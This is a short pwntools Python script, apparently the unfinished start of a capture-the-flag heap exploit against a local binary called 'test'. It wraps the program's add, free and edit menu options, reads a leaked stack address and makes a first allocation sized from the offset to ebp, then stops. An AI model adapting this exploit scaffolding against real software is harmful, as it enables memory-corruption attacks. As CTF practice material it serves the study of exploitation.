from pwn import *
context.update(log_level = 'debug')
p = None
def Add(size):
	global p
	p.sendlineafter('>', '1')
	p.sendlineafter('Size: ', str(size))
def Free(addr):
	global p
	p.sendlineafter('>', '2')
	p.sendlineafter('Address: ', str(addr))
def Edit(idx):
	global p
	p.sendlineafter('>', '3')
	p.sendlineafter('Index: ', str(idx))
p = process('test')
addr_stack = int(p.recvline().replace('\n', '\x00'), 16)
log.info('stack: ' + hex(addr_stack))
#to ebp : 0xa0
Add(0xa0-8)

